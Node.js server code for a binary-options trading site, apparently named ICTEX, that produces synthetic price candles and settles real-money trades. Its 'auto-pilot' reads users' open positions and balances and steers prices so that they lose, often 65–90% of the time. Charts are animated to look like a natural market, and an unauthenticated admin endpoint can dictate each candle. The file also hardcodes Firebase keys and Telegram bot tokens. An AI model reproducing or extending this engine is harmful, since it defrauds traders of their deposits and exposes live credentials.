// --- START: main app server.js (v41.0 - Pure Random & Quotex Jitter Engine) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const axios = require('axios');
const firebase = require('firebase/app');
require('firebase/database');

// --- Anti-Crash Protection ---
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- SYSTEM CONSTANTS ---
const TIMEFRAME = 60000;
const TICK_MS = 150; // Faster tick rate for more chaotic jumps
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 100;
const MAX_CANDLES = 5000;

const SMART_AUTO_PILOT = true;

const markets = {};
const activeTradesDb = {};

// Cache users
const usersCache = {};
db.ref('users').on('child_added', snap => { usersCache[snap.key] = snap.val(); });
db.ref('users').on('child_changed', snap => { usersCache[snap.key] = snap.val(); });

let cachedServerUrl = "";
db.ref('admin/settings/activeServerUrl').on('value', (snap) => {
    cachedServerUrl = snap.val() || "";
});

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach(marketId => {
        const nodeData = fbMarkets[marketId] || {};
        activeTradesDb[marketId] = nodeData.activeTrades || {};
        const type = nodeData.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

// 🔥 THE NEW PURE RANDOM MARKET ENGINE 🔥
// This generates target boundaries, but allows infinite natural variation
function generateRealisticCandle(marketData, timestamp, open, forcedDirection = null, isLive = false) {
    const safeOpen = Math.max(MIN_PRICE, open);

    // Natural Market Breathing (Volatility expansion and contraction)
    marketData.volatility = (marketData.volatility * 0.9) + ((Math.random() - 0.5) * 0.2);
    marketData.volatility = Math.max(0.4, Math.min(2.0, marketData.volatility));

    // Base movement scale based on current price
    const baseScale = safeOpen * 0.00006 * marketData.volatility;

    // Pure Random Walk Generation for Body
    // Using exponential distribution to make mostly normal candles, but occasional massive breakouts
    let rawBodyMovement = (Math.random() - 0.5) * 2.0; 
    
    // Apply forced direction (from Auto-Pilot tracking)
    if (forcedDirection === 'GREEN') rawBodyMovement = Math.abs(rawBodyMovement) + 0.1;
    else if (forcedDirection === 'RED') rawBodyMovement = -Math.abs(rawBodyMovement) - 0.1;

    // The actual difference between open and close
    const bodyDiff = baseScale * rawBodyMovement * (1 + Math.random() * 2);
    const close = safeOpen + bodyDiff;

    // Randomize Wicks Independently (No forced shapes)
    // Sometimes no wick (0), sometimes massive wick
    const maxBody = Math.max(safeOpen, close);
    const minBody = Math.min(safeOpen, close);

    const upWickDiff = baseScale * -Math.log(Math.random()) * 0.5; // Exponential random
    const dnWickDiff = baseScale * -Math.log(Math.random()) * 0.5;

    const high = maxBody + upWickDiff;
    const low = minBody - dnWickDiff;

    if (!isLive) return { timestamp, open: roundPrice(safeOpen), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close) };

    return {
        timestamp, open: roundPrice(safeOpen), high: roundPrice(safeOpen), low: roundPrice(safeOpen), close: roundPrice(safeOpen),
        isPredetermined: true, isNatural: !forcedDirection, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: 'NORMAL'
    };
}

// 👑 ADMIN COMMAND ENGINE (God Mode - Completely Separate)
function generateAdminCandle(timestamp, open, command, cloneData) {
    if (command === 'CUSTOM_CLONE' && cloneData) {
        const bodySize = cloneData.body || 0;
        const upperWick = cloneData.upperWick || 0;
        const lowerWick = cloneData.lowerWick || 0;
        const close = cloneData.isGreen ? open + bodySize : open - bodySize;
        const high = Math.max(open, close) + upperWick;
        const low = Math.min(open, close) - lowerWick;

        return {
            timestamp, open: roundPrice(open), high: roundPrice(open), low: roundPrice(open), close: roundPrice(open),
            isPredetermined: true, isNatural: false, isAdminCommand: true, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: 'CUSTOM'
        };
    }

    const isGreen = command.includes('GREEN') || command === 'BULLISH_MARUBOZU';
    const isDoji = command === 'DOJI';
    const baseVol = open * 0.00006;
    let body, upWick, dnWick;

    if (isDoji) { body = baseVol * 0.02; upWick = baseVol * 1.5; dnWick = baseVol * 1.5; } 
    else if (command.includes('MARUBOZU')) { body = baseVol * 2.5; upWick = 0; dnWick = 0; } 
    else if (command.includes('HAMMER')) { body = baseVol * 0.5; upWick = 0.1; dnWick = baseVol * 2.0; } 
    else if (command.includes('SHOOTING_STAR')) { body = baseVol * 0.5; upWick = baseVol * 2.0; dnWick = 0.1; } 
    else { body = baseVol * 1.0; upWick = baseVol * 0.5; dnWick = baseVol * 0.5; }

    const close = isGreen ? open + body : open - body;
    const high = Math.max(open, close) + upWick;
    const low = Math.min(open, close) - dnWick;

    return {
        timestamp, open: roundPrice(open), high: roundPrice(open), low: roundPrice(open), close: roundPrice(open),
        isPredetermined: true, isNatural: false, isAdminCommand: true, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: command
    };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;

    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) { }

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;
    
    markets[marketId] = { marketId, marketPath: path, volatility: 1.0, history: [], currentPrice: startPrice };

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateRealisticCandle(markets[marketId], nowPeriod - (i * TIMEFRAME), currentPrice, null, false);
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId].history = candles;
    markets[marketId].currentPrice = currentPrice;
}

function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    if (currentPeriod > lastCandle.timestamp) {
        let newCandle;

        // Admin Override Check
        if (marketData.nextCandleCommand) {
            newCandle = generateAdminCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand, marketData.nextCandleCloneData);
            marketData.nextCandleCommand = null;
            marketData.nextCandleCloneData = null;
        }

        // Auto Pilot Tracker
        if (!newCandle && SMART_AUTO_PILOT) {
            const trades = activeTradesDb[marketData.marketId] || {};
            let totalUp = 0, totalDown = 0;
            let uniqueUsers = new Set();
            let singleUserId = null;

            const nextPeriod = currentPeriod + TIMEFRAME;

            Object.values(trades).forEach(t => {
                const isDemo = t.isDemo === true || t.isTournament === true;
                if (!isDemo) {
                    if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000 && t.expiryTimestamp > currentPeriod) {
                        uniqueUsers.add(t.uid);
                        singleUserId = t.uid;
                        if (t.direction === 'UP') totalUp += parseFloat(t.amount || 0);
                        if (t.direction === 'DOWN') totalDown += parseFloat(t.amount || 0);
                    }
                }
            });

            let targetDirection = null;

            if (uniqueUsers.size > 1) {
                if (totalUp > totalDown) targetDirection = 'RED';
                else if (totalDown > totalUp) targetDirection = 'GREEN';
            }
            else if (uniqueUsers.size === 1) {
                const uData = usersCache[singleUserId];
                let forceLoss = false;
                let lossProbability = 0.65;

                if (uData && uData.tradeTrail) {
                    const trail = uData.tradeTrail;
                    const currentBal = uData.realBalance || 0;
                    const potentialWinBal = currentBal + ((totalUp + totalDown) * 0.85);

                    if (trail.isUnder65) {
                        if (trail.phase === 1) {
                            if (potentialWinBal > trail.targetBalance * 1.5) forceLoss = true;
                            else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05; 
                            else lossProbability = 0.40;
                        } else if (trail.phase === 2) { lossProbability = 0.85; } 
                        else if (trail.phase === 3) {
                            if (potentialWinBal > trail.targetBalance * 1.5) forceLoss = true;
                            else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05; 
                            else lossProbability = 0.40;
                        } else if (trail.phase === 4) { lossProbability = 0.90; }
                    } else {
                        if (trail.phase === 1) { lossProbability = 0.85; } 
                        else if (trail.phase === 2) {
                            if (potentialWinBal > trail.targetBalance * 1.5) forceLoss = true;
                            else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05; 
                            else lossProbability = 0.40;
                        } else if (trail.phase === 3) { lossProbability = 0.85; } 
                        else if (trail.phase === 4) {
                            if (potentialWinBal > trail.targetBalance * 1.5) forceLoss = true;
                            else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05; 
                            else lossProbability = 0.40;
                        } else if (trail.phase === 5) { lossProbability = 0.90; }
                    }
                } else {
                    let dp = (uData && uData.dailyProfit) ? uData.dailyProfit : 0;
                    if (dp > 20) lossProbability = 0.85;
                    else if (dp > 0) lossProbability = 0.75;
                    else if (dp < -50) lossProbability = 0.40;
                }

                if (!forceLoss) forceLoss = Math.random() < lossProbability;
                const userPrimaryDirection = totalUp > totalDown ? 'UP' : 'DOWN';
                targetDirection = forceLoss ? (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN') : (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED');
            }

            newCandle = generateRealisticCandle(marketData, currentPeriod, lastCandle.close, targetDirection, true);
        }

        if (!newCandle) {
            newCandle = generateRealisticCandle(marketData, currentPeriod, lastCandle.close, null, true);
        }

        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        return newCandle;
    }
    return lastCandle;
}

// ⚡ QUOTEX-STYLE JITTER ENGINE (আটকে আটকে লাফাবে) ⚡
function updateRealisticPrice(marketData, candle, currentPeriod) {
    if (!candle.isPredetermined) return;

    const now = Date.now();
    const timeElapsed = Math.max(0, now - currentPeriod);
    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);

    // Initialize Jitter Memory for this specific candle
    if (!candle.nextJumpTime) {
        candle.nextJumpTime = now;
        marketData.currentPrice = candle.open;
        candle.liveHigh = candle.open;
        candle.liveLow = candle.open;
        candle.jumpFactor = (candle.open * 0.00008) * (0.5 + Math.random());
    }

    // Only move price when the internal "Jump Timer" is reached (Creates the stutter effect)
    if (now >= candle.nextJumpTime) {
        // Base linear progress towards the target close
        const baseline = candle.open + (candle.targetClose - candle.open) * progress;
        
        // Huge chaotic jumps that randomly shoot towards targets
        let chaoticJump = (Math.random() - 0.5) * 2 * candle.jumpFactor;
        
        let newPrice = baseline + chaoticJump;

        // Occasional extreme spikes to naturally build the target Wicks
        if (Math.random() < 0.15) {
            newPrice += (candle.targetHigh - newPrice) * Math.random();
        } else if (Math.random() < 0.15) {
            newPrice -= (newPrice - candle.targetLow) * Math.random();
        }

        marketData.currentPrice = newPrice;
        
        // Randomize the next freeze time (200ms to 900ms delay) -> This causes the "stuck then jump" feel
        candle.nextJumpTime = now + (200 + Math.random() * 700);
    }

    // Lock to final close in the last 2 seconds
    if (timeElapsed >= TIMEFRAME - 2000) {
        marketData.currentPrice = candle.targetClose;
    }

    // Hard boundary constraints (Admin/AutoPilot Safety)
    marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
    marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);

    // Update live candle visually
    candle.close = roundPrice(marketData.currentPrice);
    
    // Organically stretch the wicks on the client's screen
    candle.liveHigh = Math.max(candle.liveHigh, candle.close);
    candle.liveLow = Math.min(candle.liveLow, candle.close);

    candle.high = roundPrice(candle.liveHigh);
    candle.low = roundPrice(candle.liveLow);
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300), serverTime: Date.now() }));
                }
            }
        } catch (_) { }
    });
});

app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

app.post('/api/admin/command', async (req, res) => {
    const { marketId, command, cloneData } = req.body;
    if (markets[marketId]) {
        markets[marketId].nextCandleCommand = command;
        if (cloneData) markets[marketId].nextCandleCloneData = cloneData;
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

app.post('/api/admin/manual-ping', async (req, res) => {
    try {
        const timestamp = Date.now();
        const logRef = db.ref('admin/ping_logs').push();
        await logRef.set({ timestamp: timestamp, type: 'manual_ping', status: 'success' });

        db.ref('admin/ping_logs').once('value', (snap) => {
            if (snap.exists() && snap.numChildren() > 30) {
                let toDelete = snap.numChildren() - 30;
                snap.forEach(child => { if (toDelete > 0) { child.ref.remove(); toDelete--; } });
            }
        });

        await sendPingBotAlert(`⚡️ <b>Manual Ping Triggered!</b>\n\nICTEX Nexus Monitor has verified active connection. Render is awake and sytem is operational.`);
        res.json({ success: true, message: 'Pulse accepted' });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

let lastSyncTime = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;

    for (const marketId in markets) {
        const marketData = markets[marketId];
        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
        if (!candle) continue;

        updateRealisticPrice(marketData, candle, currentPeriod);
        broadcastCandle(marketId, candle);
    }

    if (now - lastSyncTime > 1500) {
        lastSyncTime = now;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            if (m.currentPrice) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: m.currentPrice, timestamp: Date.now() };
            }
        }
        if (Object.keys(batchUpdates).length > 0) db.ref().update(batchUpdates).catch(() => { });
    }
}, TICK_MS);


// =====================================================================
// SERVER-SIDE TRADE RESOLUTION & TELEGRAM NOTIFICATION ENGINE
// =====================================================================

const TELEGRAM_BOT_TOKEN = "8031969785:AAFYcw6HN9kL0oG4JxoU3NKEHvPsxqVSg-I";
const TELEGRAM_CHAT_ID = "7504616242";

// 📢 PING BOT
const PING_BOT_TOKEN = "7479515201:AAF08je2ERy60W_BRyibHMz_pQ--4nhPuNc";
const PING_CHAT_ID = "7504616242";

async function sendTgMessage(text, replyToId = null) {
    try {
        const payload = { chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' };
        if (replyToId) payload.reply_to_message_id = replyToId;
        const res = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, payload);
        return res.data.result.message_id;
    } catch (e) { console.log("TG Error:", e.message); return null; }
}

async function sendPingBotAlert(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${PING_BOT_TOKEN}/sendMessage`, { chat_id: PING_CHAT_ID, text: text, parse_mode: 'HTML' });
    } catch (e) { console.log("Ping Bot error:", e.message); }
}

setInterval(async () => {
    const now = Date.now();
    try {
        const usersSnap = await db.ref('users').once('value');
        if (!usersSnap.exists()) return;

        const users = usersSnap.val();

        for (const uid in users) {
            const user = users[uid];
            if (!user.activeTrades) continue;

            for (const tradeId in user.activeTrades) {
                const trade = user.activeTrades[tradeId];
                const payoutRate = trade.payoutRate || 1.85;

                if (!trade.tgMessageId && !trade.isDemo && !trade.isTournament) {
                    let currentBal = parseFloat(user.realBalance || 0); 
                    let expWinBal = currentBal + (trade.amount * payoutRate);

                    const msg = `🟢 <b>New Trade Opened</b>\n\n` +
                        `👤 <b>Name:</b> ${user.name}\n` +
                        `🆔 <b>UID:</b> ${uid}\n` +
                        `📈 <b>Market:</b> ${trade.market}\n` +
                        `⏱ <b>Duration:</b> ${trade.expiryType === 'time' ? trade.expiryType : 'Seconds'}\n` +
                        `📊 <b>Direction:</b> ${trade.direction}\n` +
                        `💵 <b>Amount:</b> $${trade.amount}\n` +
                        `💰 <b>Current Balance:</b> $${currentBal.toFixed(2)}\n\n` +
                        `💸 <b>Balance if Win:</b> $${expWinBal.toFixed(2)}\n` +
                        `💸 <b>Balance if Loss:</b> $${currentBal.toFixed(2)}`;

                    const msgId = await sendTgMessage(msg);
                    if (msgId) await db.ref(`users/${uid}/activeTrades/${tradeId}/tgMessageId`).set(msgId);
                }

                if (now >= trade.expiryTimestamp) {
                    let closingPrice = trade.openPrice;
                    const mId = trade.marketId;

                    if (markets[mId] && markets[mId].currentPrice) {
                        closingPrice = markets[mId].currentPrice; 
                    } else {
                        const marketPath = mId ? mId.replace(/[\.\/ ]/g, '-').toLowerCase() : trade.market.replace(/[\.\/ ]/g, '-').toLowerCase();
                        const candleSnap = await db.ref(`markets/${marketPath}/candles/60s`).orderByKey().endAt(String(trade.expiryTimestamp)).limitToLast(1).once('value');
                        if (candleSnap.exists()) closingPrice = Object.values(candleSnap.val())[0].close;
                    }

                    const betAmount = parseFloat(trade.amount);
                    const diff = closingPrice - trade.openPrice;

                    let result = 'push', payout = betAmount, profitChange = 0;
                    if (Math.abs(diff) < 1e-6) {
                        const randomEdge = Math.random() > 0.5 ? 0.00001 : -0.00001;
                        closingPrice += randomEdge;
                        const newDiff = closingPrice - trade.openPrice;
                        if ((newDiff > 0 && trade.direction === 'UP') || (newDiff < 0 && trade.direction === 'DOWN')) {
                            result = 'win'; payout = betAmount * payoutRate; profitChange = payout - betAmount;
                        } else {
                            result = 'loss'; payout = 0; profitChange = -betAmount;
                        }
                    } else if ((diff > 0 && trade.direction === 'UP') || (diff < 0 && trade.direction === 'DOWN')) {
                        result = 'win'; payout = betAmount * payoutRate; profitChange = payout - betAmount;
                    } else {
                        result = 'loss'; payout = 0; profitChange = -betAmount;
                    }

                    const updates = {};
                    if (!trade.isDemo && !trade.isTournament) {
                        updates[`users/${uid}/realBalance`] = firebase.database.ServerValue.increment(result === 'win' ? profitChange + trade.realAmount : (result === 'push' ? trade.realAmount : 0));
                        updates[`users/${uid}/totalProfitLoss`] = firebase.database.ServerValue.increment(profitChange);
                        updates[`users/${uid}/dailyProfit`] = firebase.database.ServerValue.increment(profitChange);
                    }

                    updates[`users/${uid}/activeTrades/${tradeId}`] = null;
                    updates[`admin/markets/${trade.marketId}/activeTrades/${tradeId}`] = null;

                    const historyEntry = { ...trade, closePrice: closingPrice, payout, result, timestamp: Date.now() };
                    updates[`users/${uid}/tradeHistory/${tradeId}`] = historyEntry;

                    await db.ref().update(updates);

                    if (trade.tgMessageId) {
                        const icon = result === 'win' ? '✅' : (result === 'loss' ? '❌' : '🔄');
                        await sendTgMessage(`${icon} <b>Trade Closed: ${result.toUpperCase()}</b>\n💵 <b>Payout:</b> $${payout.toFixed(2)}`, trade.tgMessageId);
                    }
                }
            }
        }
    } catch (e) { console.log("Server Resolution Loop Error:", e); }
}, 1000);

// =====================================================================
// 🔥 BULLETPROOF TELEGRAM BOT ENGINE & KEEP-ALIVE 24/7 ENGINE 🔥
// =====================================================================
const https = require('https');
let lastUpdateId = 0;

const activeLinkingSessions = {};
const activeSupportSessions = {};
const adminSupportMap = {};
const ADMIN_OWNER_ID = "7504616242";

setInterval(async () => {
    if (cachedServerUrl && cachedServerUrl.startsWith('https://')) {
        try {
            await axios.get(`${cachedServerUrl}/ping`);
            const logRef = db.ref('admin/ping_logs').push();
            await logRef.set({ timestamp: Date.now(), type: 'auto_pulse', status: 'success' });
            db.ref('admin/ping_logs').once('value', (snap) => {
                if (snap.exists() && snap.numChildren() > 30) {
                    let toDelete = snap.numChildren() - 30;
                    snap.forEach(child => { if (toDelete > 0) { child.ref.remove(); toDelete--; } });
                }
            });
        } catch (e) { }
    }
}, 4 * 60 * 1000);

setInterval(async () => {
    try {
        await db.ref('admin/server_status').set({ lastActive: Date.now(), version: 'V40.0' });
        await sendPingBotAlert(`⚙️ <b>ICTEX Hourly Pulse Status:</b> Server is fully ACTIVE and running smoothly. Keep-alive system is engaged.`);
    } catch (e) {}
}, 60 * 60 * 1000); 

function sendTelegramMessage(chatId, text) {
    return new Promise((resolve) => {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' });

        const req = https.request(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
        }, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    const data = JSON.parse(body);
                    if (data.ok && data.result) resolve(data.result.message_id);
                    else resolve(null);
                } catch (e) { resolve(null); }
            });
        });
        req.on('error', () => resolve(null));
        req.write(payload);
        req.end();
    });
}

function deleteTelegramMessage(chatId, messageId) {
    if (!messageId) return;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
    const payload = JSON.stringify({ chat_id: chatId, message_id: messageId });
    const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } });
    req.on('error', () => { }); req.write(payload); req.end();
}

function forwardTelegramMessage(toChatId, fromChatId, messageId) {
    return new Promise((resolve) => {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/forwardMessage`;
        const payload = JSON.stringify({ chat_id: toChatId, from_chat_id: fromChatId, message_id: messageId });
        const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } }, (res) => {
            let body = ''; res.on('data', chunk => body += chunk);
            res.on('end', () => { try { const data = JSON.parse(body); resolve(data.ok && data.result ? data.result.message_id : null); } catch (e) { resolve(null); } });
        });
        req.on('error', () => resolve(null)); req.write(payload); req.end();
    });
}

function pollTelegramUpdates() {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;

    const req = https.get(url, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', async () => {
            try {
                const response = JSON.parse(body);
                if (response.ok && response.result.length > 0) {
                    for (const update of response.result) {
                        lastUpdateId = update.update_id;
                        if (update.message) {
                            const msgDate = update.message.date || 0;
                            const nowSec = Math.floor(Date.now() / 1000);
                            if (msgDate < nowSec - 60) continue; 

                            const text = update.message.text ? update.message.text.trim() : "";
                            const chatId = String(update.message.chat.id);
                            const textLower = text.toLowerCase();

                            if (chatId === ADMIN_OWNER_ID && update.message.reply_to_message) {
                                const replyToId = update.message.reply_to_message.message_id;
                                const targetUserId = adminSupportMap[replyToId];
                                if (targetUserId && text) await sendTelegramMessage(targetUserId, `💬 *Response from Support:* \n\n${text}`);
                                continue;
                            }

                            if (textLower === '/start') {
                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\nPlease end the active session first using /endhelp.`); continue; }
                                await sendTelegramMessage(chatId, `✨ *WELCOME TO ICTEX SECURE GATEWAY* ✨\n\nHello Trader! I am the official ICTEX Security and 2FA Bot.\n\n*Available Commands:*\n🔑 /linkictex - Link account securely.\n👤 /accounts - View linked profiles.\n💬 /help - Open a direct support session.`);
                            }
                            else if (textLower === '/linkictex') {
                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ Please end the active help session first using /endhelp.`); continue; }
                                if (activeLinkingSessions[chatId]) {
                                    clearTimeout(activeLinkingSessions[chatId].timeoutRef);
                                    if (activeLinkingSessions[chatId].linkMessageId) deleteTelegramMessage(chatId, activeLinkingSessions[chatId].linkMessageId);
                                }
                                const linkMessageId = await sendTelegramMessage(chatId, `🔑 *ICTEX Secure Account Link Initiation*\nPlease go to your **ICTEX Trading Terminal -> Profile Settings**, copy your 15-digit secure linking code, and paste it here.\n\n*Code format:* \`XXXXX - XXXXX - XXXXX\``);
                                activeLinkingSessions[chatId] = {
                                    linkMessageId: linkMessageId,
                                    expiresAt: Date.now() + 60000,
                                    timeoutRef: setTimeout(async () => {
                                        if (linkMessageId) deleteTelegramMessage(chatId, linkMessageId);
                                        const expiredMessageId = await sendTelegramMessage(chatId, `⚠️ *Linking Session Expired*\nYour 1-minute account linking session has expired. Type /linkictex to start again.`);
                                        setTimeout(() => { if (expiredMessageId) deleteTelegramMessage(chatId, expiredMessageId); }, 10000);
                                        delete activeLinkingSessions[chatId];
                                    }, 60000)
                                };
                            }
                            else if (textLower === '/help') {
                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ You are already in an active support session.`); continue; }
                                activeSupportSessions[chatId] = { active: true, isFirstMessage: true };
                                await sendTelegramMessage(chatId, `💬 *ICTEX Help Desk Started*\nYou are now connected to the Support Desk. Please describe your problem in detail.\n\n🔒 _Tap /endhelp to close the session._`);
                            }
                            else if (textLower === '/endhelp' || textLower === '/end') {
                                if (activeSupportSessions[chatId]) {
                                    delete activeSupportSessions[chatId];
                                    await sendTelegramMessage(chatId, `🔒 *SUPPORT SESSION CLOSED*`);
                                }
                            }
                            else {
                                if (activeSupportSessions[chatId] && activeSupportSessions[chatId].active) {
                                    if (activeSupportSessions[chatId].isFirstMessage) {
                                        activeSupportSessions[chatId].isFirstMessage = false;
                                        await sendTelegramMessage(chatId, `Please wait, our support agents will contact you shortly.`);
                                    }
                                    const forwardedId = await forwardTelegramMessage(ADMIN_OWNER_ID, chatId, update.message.message_id);
                                    if (forwardedId) adminSupportMap[forwardedId] = chatId;
                                }
                                else {
                                    const session = activeLinkingSessions[chatId];
                                    if (session && Date.now() < session.expiresAt) {
                                        const codeMatch = text.match(/[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}/);
                                        if (codeMatch) {
                                            const linkCode = codeMatch[0].toUpperCase();
                                            const linkSnap = await db.ref(`telegram_links/${linkCode}`).once('value');
                                            if (linkSnap.exists()) {
                                                const uid = linkSnap.val().uid;
                                                await db.ref(`users/${uid}`).update({ telegramChatId: chatId, twoFactorEnabled: true });
                                                await linkSnap.ref.remove();
                                                clearTimeout(session.timeoutRef);
                                                if (session.linkMessageId) deleteTelegramMessage(chatId, session.linkMessageId);
                                                delete activeLinkingSessions[chatId];
                                                await sendTelegramMessage(chatId, `🎉 *ACCOUNT PAIRED SUCCESSFULLY!* 🎉\nYour Telegram profile is now fully bound to your ICTEX Trading Account.`);
                                            } else {
                                                await sendTelegramMessage(chatId, `❌ *PAIRING ATTEMPT FAILED*\nThe linking code is invalid or expired.`);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (e) { }
            setTimeout(pollTelegramUpdates, 800);
        });
        res.on('error', (err) => { setTimeout(pollTelegramUpdates, 5000); });
    }).on('error', (err) => { setTimeout(pollTelegramUpdates, 5000); });
    req.setTimeout(15000, () => { req.destroy(); });
}

function deleteTelegramWebhook() {
    https.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`, (res) => { res.resume(); pollTelegramUpdates(); }).on('error', () => { pollTelegramUpdates(); });
}
deleteTelegramWebhook();

const activeOtps = {};
async function handleNewOtp(uid, chatId, otp, userName) {
    if (activeOtps[uid]) {
        if (activeOtps[uid].timeoutRef) clearTimeout(activeOtps[uid].timeoutRef);
        if (activeOtps[uid].otpMessageId) deleteTelegramMessage(activeOtps[uid].chatId, activeOtps[uid].otpMessageId);
        delete activeOtps[uid];
    }
    const otpMessageId = await sendTelegramMessage(chatId, `🔐 *ICTEX VIP Security Alert*\n\nHello *${userName}*,\nYour code is: \`${otp.code}\`\n\n_Expires in 60s._`);
    activeOtps[uid] = {
        code: otp.code, chatId, otpMessageId, expiresAt: otp.expiresAt, timeoutRef: setTimeout(async () => {
            const expiredMessageId = await sendTelegramMessage(chatId, `⚠️ Code expired.`);
            setTimeout(() => { if (otpMessageId) deleteTelegramMessage(chatId, otpMessageId); if (expiredMessageId) deleteTelegramMessage(chatId, expiredMessageId); }, 10000);
            db.ref(`users/${uid}/pendingOTP`).remove().catch(() => { });
            delete activeOtps[uid];
        }, 60000)
    };
}
db.ref('users').on('child_changed', (snap) => {
    const user = snap.val();
    if (user && user.pendingOTP && user.telegramChatId) {
        if (!activeOtps[snap.key] || activeOtps[snap.key].code !== user.pendingOTP.code) handleNewOtp(snap.key, user.telegramChatId, user.pendingOTP, user.name || 'User');
    } else if (user && !user.pendingOTP && activeOtps[snap.key]) {
        if (activeOtps[snap.key].timeoutRef) clearTimeout(activeOtps[snap.key].timeoutRef);
        if (activeOtps[snap.key].otpMessageId) deleteTelegramMessage(activeOtps[snap.key].chatId, activeOtps[snap.key].otpMessageId);
        delete activeOtps[snap.key];
    }
});

app.get('/ping', async (_req, res) => {
    res.send('Server V41.0 - Pure Random & Quotex Jitter Engine Active');
    const timeStr = new Date().toLocaleTimeString('en-US', { timeZone: 'Asia/Dhaka' });
    await sendPingBotAlert(`⚙️ <b>Pulse Ping Received:</b>\nTime: <code>${timeStr}</code> (Dhaka)\nStatus: <code>Render Active</code>`);
});

const PORT = process.env.PORT || 3000;
